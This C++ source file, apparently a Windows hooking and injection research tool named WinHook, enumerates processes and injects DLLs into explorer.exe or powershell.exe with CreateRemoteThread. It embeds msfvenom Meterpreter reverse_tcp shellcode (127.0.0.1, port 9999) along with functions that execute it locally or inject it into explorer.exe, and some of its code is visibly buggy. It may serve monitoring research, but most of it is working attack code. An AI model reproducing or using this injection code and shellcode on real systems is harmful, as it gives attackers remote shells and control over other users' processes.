// WinHook.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <string>
#include <tlhelp32.h>
#include <iostream>
#include <clocale>
#include <locale>
#include <vector>
#include <cstdlib>

#include "pedump.h"
#include "winhook.h"
#include "utility.h"
#include "stdafx.h"

using namespace std;

/*
	Reference: https://stackoverflow.com/questions/4804298/how-to-convert-wstring-into-string
*/
std::string convert(std::wstring ws) {
	std::setlocale(LC_ALL, "");
	const std::locale locale("");
	typedef std::codecvt<wchar_t, char, std::mbstate_t> converter_type;
	const converter_type& converter = std::use_facet<converter_type>(locale);
	std::vector<char> to(ws.length() * converter.max_length());
	std::mbstate_t state;
	const wchar_t* from_next;
	char* to_next;
	const converter_type::result result = converter.out(state, ws.data(), ws.data() + ws.length(), from_next, &to[0], &to[0] + to.size(), to_next);
	if (result == converter_type::ok or result == converter_type::noconv) {
		const std::string s(&to[0], to_next);
		//std::cout << "std::string =     " << s << std::endl;
		return s;
	}
	return NULL;
}

/**
  Reference: Microsoft Documents

  typedef struct _PROCESS_INFORMATION {
	HANDLE hProcess;
	HANDLE hThread;
	DWORD  dwProcessId;
	DWORD  dwThreadId;
  } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

*/

LPPROCESS_INFORMATION open_process(char *lpApplicationName, int wait_time) {

	STARTUPINFOA si;
	LPPROCESS_INFORMATION pi = (PROCESS_INFORMATION*)malloc(sizeof(PROCESS_INFORMATION));

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(si);

	printf(" Creating process with file path %s.\n", lpApplicationName);

	if (CreateProcessA(lpApplicationName,
		(LPSTR)L"",           // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0, //CREATE_NEW_CONSOLE, //CREATE_SUSPENDED,
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory
		&si,            // Pointer to STARTUPINFO structure
		pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
	)) {
		WaitForInputIdle(pi->hProcess, wait_time);
		//CloseHandle( pi.hProcess );
		//CloseHandle( pi.hThread );
	} else {
		printf("CreateProcess Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
	}

	return pi;

}//end of Function


PROCESSENTRY32* snapshotAllProcessesEntry(DWORD processId) {
	
	PROCESSENTRY32 *pe32 = (PROCESSENTRY32*)malloc(sizeof(PROCESSENTRY32));

	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
	}
	else {
		pe32->dwSize = sizeof(PROCESSENTRY32);

		if (!Process32First(hProcessSnap, pe32))
		{
			printf("Process32First Failed, GetLastError() = %u\n", (uint32_t)GetLastError()); // show cause of failure
			CloseHandle(hProcessSnap);          // clean the snapshot object
		}
		else {
			do {

				_tprintf(TEXT(" Reading Process (%s) : (%lu)"), pe32->szExeFile, pe32->th32ProcessID);

				// Retrieve the priority class.
				DWORD dwPriorityClass = 0;
				HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, pe32->th32ProcessID);

				if (hProcess == NULL)
					printf("OpenProcess Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
				else if (pe32->th32ProcessID == processId) {
					CloseHandle(hProcessSnap);
					return pe32;
				}

				CloseHandle(hProcess);

			} while (Process32Next(hProcessSnap, pe32));
		}
	}

	CloseHandle(hProcessSnap);
	return NULL;
}

DWORD getProcessIdFromSnapshot(wchar_t* processName) {

	std::wstring wprocessName = std::wstring(processName);
	PROCESSENTRY32 *pe32 = (PROCESSENTRY32*)malloc(sizeof(PROCESSENTRY32));
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
	}
	else {
		pe32->dwSize = sizeof(PROCESSENTRY32);

		if (!Process32First(hProcessSnap, pe32))
		{
			printf("Process32First Failed, GetLastError() = %u\n", (uint32_t)GetLastError()); // show cause of failure
			CloseHandle(hProcessSnap);          // clean the snapshot object
		}
		else {
			do {

				//_tprintf(TEXT(" Reading Process (%s) : (%lu)"), pe32->szExeFile, pe32->th32ProcessID);

				// Retrieve the priority class.
				DWORD dwPriorityClass = 0;
				HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, pe32->th32ProcessID);

				if (hProcess == NULL)
					printf("OpenProcess Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
				else if (wprocessName.compare(pe32->szExeFile)==0) {
					//cout << pe32->szExeFile << endl;
					CloseHandle(hProcessSnap);
					CloseHandle(hProcess);
					return pe32->th32ProcessID;
				}

				CloseHandle(hProcess);

			} while (Process32Next(hProcessSnap, pe32));
		}
	}

	CloseHandle(hProcessSnap);
	return 0;
}

HANDLE snapshotAllProcesses(DWORD processId, DWORD dwDesiredAccess) {

	PROCESSENTRY32 *pe32 = (PROCESSENTRY32*)malloc(sizeof(PROCESSENTRY32));
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
	}
	else {
		pe32->dwSize = sizeof(PROCESSENTRY32);

		if (!Process32First(hProcessSnap, pe32))
		{
			printf("Process32First Failed, GetLastError() = %u\n", (uint32_t)GetLastError()); // show cause of failure
			CloseHandle(hProcessSnap);          // clean the snapshot object
		}
		else {
			do {

				//_tprintf(TEXT(" Reading Process (%s) : (%lu)"), pe32->szExeFile, pe32->th32ProcessID);

				// Retrieve the priority class.
				DWORD dwPriorityClass = 0;
				HANDLE hProcess = OpenProcess(dwDesiredAccess, FALSE, pe32->th32ProcessID);

				if (hProcess == NULL)
					printf("OpenProcess Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
				else if (pe32->th32ProcessID == processId) {
					CloseHandle(hProcessSnap);
					return hProcess;
				}

				CloseHandle(hProcess);

			} while (Process32Next(hProcessSnap, pe32) );
		}
	}

	CloseHandle(hProcessSnap);
	return NULL;
}


HANDLE snapshotAllProcessesA(DWORD processId) {
	return snapshotAllProcesses(processId, PROCESS_VM_READ);
}

MODULEENTRY32* snapshotAllModules(DWORD processId, std::string dllName) {

	MODULEENTRY32 *me32 = (MODULEENTRY32*)malloc(sizeof(MODULEENTRY32));

	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, processId);

	if (hModuleSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
	}
	else {
		me32->dwSize = sizeof(MODULEENTRY32);

		if (!Module32First(hModuleSnap, me32))
		{
			printf("Module32First Failed, GetLastError() = %u\n", (uint32_t)GetLastError()); // show cause of failure
			CloseHandle(hModuleSnap);
		}
		else {
			do {

				std::wstring moduleName = std::wstring(me32->szModule);
				std::wcout << moduleName << '\n';

				if (me32->szModule == NULL)
					printf("Module32Next Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
				else if (dllName.compare((char*)moduleName.c_str()) == 0) {	
					printf("=========== Module Found =============\n");
					CloseHandle(hModuleSnap);
					return me32;
				}

			} while (Module32Next(hModuleSnap, me32));
		}
	}

	CloseHandle(hModuleSnap);
	return NULL;
}

HMODULE enum_modules(HANDLE hProcess, std::string dllName) {

	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
	HMODULE hMods[1024];
	DWORD cbNeeded;
	long unsigned int i;

	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {

		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			if (GetModuleFileNameEx(hProcess, hMods[i], szProcessName, sizeof(szProcessName) / sizeof(TCHAR)))
			{
				std::wstring mname = std::wstring(szProcessName);
				std::string mnamestr = convert(mname);

//				_tprintf(TEXT("\tName: %s\n"), szProcessName);
				
				if ( dllName.compare(std::string(mnamestr)) == 0) {
					cout << "=========== Module Found =============" << endl;
					cout << "\tModule Name: " << mnamestr << endl;
					printf("\tLocation (0x%08X)\n", (unsigned int)hMods[i] );
					return hMods[i];
				}
				else {
					//cout << "\tModule Name: " << mnamestr << endl;
				}
			}
			else {
				printf("GetModuleFileNameEx Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
			}
		}//end of loop

	}
	else {
		printf("EnumProcessModules Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
	}
	
	return NULL;

}//end of function


bool stricompare(std::string str1, std::string str2) {
	return false;
}

/**
*
* Usage:
	winhook.exe -e TargetExe -f ApiName
* 
* --- Incomplete ---
*	** Hook the specific API
*
* Acheived Till now:
*	1. Check if API exists in PE header
*	2. Open the executable as a process
*	3. Enumerate all the modules and get the address of the API in memory
*/
void hookingSpecificAPIOfAnExecutable(char *argv[]) {

	std::setlocale(LC_CTYPE, "");
	char *dllname = (char*)"kernel32.dll";
	std::string apiname = std::string("CreateThread");
	std::string dllpath = std::string("C:\\Windows\\system32\\") + std::string(dllname);
	//dumpExe(argv[2]);
	//cout << dllpath << endl;

	if (ifApiExists(argv[2], apiname) == 1) {

		LPPROCESS_INFORMATION lpInfo = open_process(argv[2], 1000);

		if (lpInfo->dwProcessId) {
			printf("Started %lu\n", lpInfo->dwProcessId);
			//snapshotAllModules(lpInfo->dwProcessId, std::string(dllname));
			HMODULE dll = enum_modules(lpInfo->hProcess, dllpath);

			if (dll != NULL) {
				hook_api(apiname, dllpath, dll);
				Sleep(5000);
			}
		}

		CloseHandle(lpInfo->hProcess);
		CloseHandle(lpInfo->hThread);

	}
	else {
		printf("\n API not found in the import table \n");
	}

}//end of Function


/** 
* Reference:
* https://resources.infosecinstitute.com/using-createremotethread-for-dll-injection-on-windows/#gref
*/
bool injectDll(int procID, char *dllPath) {

	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);

	if (process == NULL) {
		printf(" Error: the specified process couldn't be found. \tError Code: %u\n", (uint32_t)GetLastError());
		printf(" Trying other way... \n");

		process = snapshotAllProcesses((DWORD)procID, PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE );
														// Required by Alpha | CreateRemoteThread | VirtualAllocEx | WriteProcessMemory

		if (process == NULL) {
			printf("Error: the specified process couldn't be found. \tError Code: %u\n", (uint32_t)GetLastError());
			return false;
		}
	}//end of if-else

	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

	if (addr == NULL) {
		printf("Error: the LoadLibraryA function was not found inside kernel32.dll library. \tError Code: %u\n", (uint32_t)GetLastError());
		return false;
	}

	const int sizeDLL = (strlen(dllPath) + 1) * sizeof(char);
//	const int sizeDLL = strlen(dllPath);
	/*
	* Allocate new memory region inside the process's address space.
	*/
	LPVOID arg = (LPVOID)VirtualAllocEx(process, NULL, sizeDLL, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (arg == NULL) {
		printf("Error: the memory could not be allocated inside the chosen process. \tError Code: %u\n", (uint32_t)GetLastError());
		return false;
	}

	/*
	* Write the argument to LoadLibraryA to the process's newly allocated memory region.
	*/

	int n = WriteProcessMemory(process, arg, dllPath, sizeDLL, NULL);
	if (n == 0) {
		printf("Error: there was no bytes written to the process's address space. \tError Code: %u\n", (uint32_t)GetLastError());
		return false;
	}

	/*
	* Inject our DLL into the process's address space.
	*/
	HANDLE threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)addr, arg, 0, NULL);
	
	if (threadID == NULL) {
		printf("Error: the remote thread could not be created. \tError Code: %u\n", (uint32_t)GetLastError());
		return false;
	} else {
		printf("Success: the remote thread was successfully created.\n");
		
		DWORD lpExitCode;// = (LPDWORD)malloc(sizeof(DWORD));
		WaitForSingleObject(threadID, INFINITE);
		GetExitCodeThread(threadID, &lpExitCode);
		VirtualFreeEx(threadID, arg, 0, MEM_RELEASE);
		CloseHandle(threadID);
		
	}

	/*
	* Close the handle to the process, becuase we've already injected the DLL.
	*/
	CloseHandle(process);
	return true;

}//end of function



/**
* Reference :
*	https://rastating.github.io/creating-a-bind-shell-tcp-shellcode/
*
*	https://netsec.ws/?p=331
*	`msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f c`
*
*/
static const unsigned char code[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x7f\x00\x00\x01"
"\x68\x02\x00\x27\x0f\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"
"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

void executeShellCodeOfReverseTCP() {
	void *exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));
	printf("Creating ReverseTCP @ port 9999. | Listening to accept for few seconds! ");
	((void(*)())exec)();
	Sleep(12000);
}

int injectShellCodeOfReverseTCP(int procID) {
	printf("Injecting Shellcode into PID %d.\n", procID);
	return (int)injectDll(procID, (char*)code);
}

int __exit(FILE* logFile) {
	printf("\nUsage : winhook.exe -p TargetProcessId -f DLLPath/Name \n");
	//log_call("Usage : winhook.exe -p TargetProcessId -f DLLPath/Name "); //Also tests the functionality in detours.dll
	fclose(logFile);
	return 0;
}

/**
* Injects the DLL created using detours.cpp, into a specific process
*
* Usage:-
	winhook.exe -p TargetProcessId -f DLLPath/Name
*/
int main(int argc, char *argv[]) {

	FILE* logFile = init_log();
	const int size = 125 * sizeof(char);
	char *msg = (char*)calloc(125, sizeof(char));
	memset(msg, '\0', size);
	setExplorer(true);

	if (argc == 1) {

		DWORD pid = getProcessIdFromSnapshot((wchar_t*)L"powershell.exe");
		//printf("PID: %u\n", pid);

		if (pid>0 && injectDll(pid, (char*)"C:\\WinHook.dll")) {
			sprintf_s(msg, size, " [%u][C:\\WinHook.dll] DLL Injected Successfully! ", pid);
			printf("%s\n", msg);
			log_call(msg);
		}
		else {
			sprintf_s(msg, size, " [C:\\WinHook.dll] DLL Injection Failed! No instance of Powershell found ");
			printf("%s\n", msg);
			log_call(msg);
		}

		Sleep(5000);
	}
	else if (argc == 2 && strcmp(argv[1], "-rsc")==0 ) {
		const unsigned int pid = GetCurrentProcessId();
		printf(" [%u] Loading WinHook Library to monitor shellcode...", pid);
		injectDll(pid, (char*)"C:\\WinHook.dll");
		Sleep(2000);
		executeShellCodeOfReverseTCP();
	}
	else if (argc == 3) {
		
		if (strcmp(argv[1], "-exp") == 0 && strcmp(argv[2], "-sc") == 0) {
			DWORD pid = getProcessIdFromSnapshot((wchar_t*)L"explorer.exe");
			injectShellCodeOfReverseTCP(pid);
		}
		else if (strcmp(argv[2], "-exp") == 0 && strcmp(argv[1], "-sc") == 0){
			DWORD pid = getProcessIdFromSnapshot((wchar_t*)L"explorer.exe");
			injectShellCodeOfReverseTCP(pid);
		}
		else {
			return __exit(logFile);
		}
	}
	else if (argc == 4) {

		char *dllpath = NULL;

		if (strcmp(argv[1], "-exp") == 0 && strcmp(argv[2], "-f") == 0) {
			dllpath = argv[3];
		}
		else if (strcmp(argv[1], "-f") == 0 && strcmp(argv[3], "-exp") == 0) {
			dllpath = argv[2];
		}
		else if (strcmp(argv[1], "-sc") == 0 && strcmp(argv[2], "-p") == 0) {
			injectShellCodeOfReverseTCP(atoi(argv[3]));
			return 0;
		}
		else if (strcmp(argv[1], "-p") == 0 && strcmp(argv[3], "-sc") == 0) {
			injectShellCodeOfReverseTCP(atoi(argv[2]));
			return 0;
		}
		else {
			return __exit(logFile);
		}

		DWORD pid = getProcessIdFromSnapshot((wchar_t*)L"explorer.exe");

		if (dllpath != NULL && injectDll(pid, dllpath)) {
			sprintf_s(msg, size, " [%s][%u] DLL Injected Successfully! ", dllpath, pid);
			printf("%s\n", msg);
			log_call(msg);
		}
		else {
			sprintf_s(msg, size, " [%s][%u] DLL Injection Failed! ", dllpath, pid);
			printf("%s\n", msg);
			log_call(msg);
		}

	}
	else if (argc == 5) {
		
		char *pid = NULL;
		char *dllpath = NULL;

		if (strcmp(argv[1], "-p") == 0 && strcmp(argv[3], "-f") == 0) {
			pid = argv[2];
			dllpath = argv[4];
		} else if (strcmp(argv[3], "-p") == 0 && strcmp(argv[1], "-f") == 0) {
			pid = argv[4];
			dllpath = argv[2];
		}
		else {
			return __exit(logFile);
		}

		if ( pid!=NULL && dllpath!=NULL && injectDll(atoi(pid), dllpath) ) {
			sprintf_s(msg, size, " [%s][%s] DLL Injected Successfully! ", dllpath, pid);
			printf("%s\n", msg);
			log_call(msg);
		}
		else {
			sprintf_s(msg, size, " [%s][%s] DLL Injection Failed! ", dllpath, pid);
			printf("%s\n", msg);
			log_call(msg);
		}
	}
	else {
		return __exit(logFile);
	}//end of if-else

	return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
